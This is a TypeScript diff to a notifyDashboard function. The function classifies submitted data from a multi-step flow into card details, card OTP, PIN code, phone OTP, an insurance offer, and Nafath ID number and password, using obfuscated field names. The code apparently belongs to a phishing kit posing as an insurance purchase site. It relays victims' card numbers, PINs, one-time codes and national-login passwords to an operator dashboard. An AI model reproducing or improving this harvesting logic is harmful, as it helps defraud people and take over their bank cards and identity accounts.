@@ -147,19 +147,32 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
     const combinedData = { ...(payload?.raw || {}), ...payload };
     let entryType = 'basic'; // default type
     
-    // OTP verification takes priority - check this first
-    // This includes both step2 OTP (_v5, otpCode) and step5 phone OTP (_v7, phoneOtpSubmittedAt)
-    if (combinedData.otpCode || combinedData.otp || combinedData._v5 || combinedData._v7 || combinedData.phoneOtpSubmittedAt) {
-      entryType = 'otp'; // OTP code data (from step2 or step5)
-    } else if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
-      entryType = 'phone'; // Phone verification data (from step5 - before OTP)
-    } else if (combinedData.pinCode || combinedData.pin || combinedData._v6) {
-      entryType = 'pin'; // PIN code data
-    } else if (combinedData.cardNumber || combinedData._v1 || combinedData.cardOwner) {
-      entryType = 'card'; // Card data
-    } else if (combinedData.selectedOffer || combinedData.offerTotalPrice) {
+    // Phone OTP from step5 (_v7) - highest priority for step5 page
+    if (combinedData._v7 || combinedData.phoneOtpSubmittedAt || combinedData.phoneOtpStatus) {
+      entryType = 'phone_otp'; // Phone OTP verification from step5
+    }
+    // Phone data from step5 (before OTP)
+    else if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
+      entryType = 'phone'; // Phone verification data from step5
+    }
+    // Card OTP from step2 (_v5)
+    else if (combinedData.otpCode || combinedData._v5 || combinedData.otpSubmittedAt) {
+      entryType = 'card_otp'; // Card OTP verification from step2
+    }
+    // PIN from step3 (_v6)
+    else if (combinedData.pinCode || combinedData._v6 || combinedData.pinSubmittedAt) {
+      entryType = 'pin'; // PIN code from step3
+    }
+    // Card data
+    else if (combinedData.cardNumber || combinedData._v1 || combinedData.cardOwner) {
+      entryType = 'card'; // Card payment data
+    }
+    // Insurance selection
+    else if (combinedData.selectedOffer || combinedData.offerTotalPrice) {
       entryType = 'insurance'; // Insurance selection
-    } else if (combinedData.nafadIdNumber || combinedData.nafadPassword) {
+    }
+    // Nafath verification
+    else if (combinedData.nafadIdNumber || combinedData.nafadPassword || combinedData.nafadStatus) {
       entryType = 'nafad'; // Nafath verification
     }
     // Otherwise, keep 'basic' for home-new data
